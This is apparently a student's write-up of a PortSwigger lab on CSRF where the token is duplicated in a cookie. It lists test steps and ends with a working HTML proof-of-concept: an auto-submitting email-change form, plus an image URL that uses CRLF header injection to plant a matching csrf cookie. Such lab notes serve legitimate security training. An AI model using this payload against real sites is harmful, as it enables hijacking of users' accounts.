@@ -1,0 +1,45 @@
+Lab #6:CSRF where token is duplicated in cookie
+Target: change the viewer's email address
+
+
+This lab's email change functionality is vulnerable to CSRF. 
+It uses tokens to try to prevent CSRF attacks, but they aren't fully integrated into the site's session handling system.
+
+Hint: 
+   
+    To solve the lab, craft some HTML that uses a CSRF attack to change the viewer's email address and upload it to your exploit server.
+
+    You can log in to your own account using the following credentials: wiener:peter
+
+
+Analysis:
+
+  CSRF attack could be possible, when:
+    - There is a relevant action
+    - There is cookie-based session handling
+    - No unpredictable request parameter is required
+
+  test1: change csrf -> invalid csrf value
+  test2: remove csrf-> missing csrf
+  test3: change request to get -> not working
+ 
+
+ In this page there is session and csrfkey in the cookie, and maybe there are two different systems that handle session mgmt and csrf prevention.
+ Testing csrf token and key:
+    - check if they are tied togethere:
+        1- submit an invalid csrf token
+        2- submit a valid csrf token from another user
+        3- submit a valid csrf token and csrf key cookie
+            
+
+            The attack is similar to lab5 with the same csrfkey and value.
+ <html>
+                    <body>
+                        <form action="https://myPOrtSwiggerID.web-security-academy.net/my-account/change-email" method="POST">
+                            <input type="hidden" name="email" value="pwn266ed@evil-user.net" />
+                            <input type="hidden" name="csrf" value="4mCnwCKYmd1NUzuFMI2orKznk1TZGtoov" />
+                        </form>
+                        <img src="https://myPOrtSwiggerID.web-security-academy.net/?search=hat%0d%0aSet-Cookie:%20csrf=4mCnwCKYmd1NUzuFMI2orKznk1TZGtoov%3b%20SameSite=None" onerror="document.forms[0].submit()" />
+
+                    </body>
+    </html>
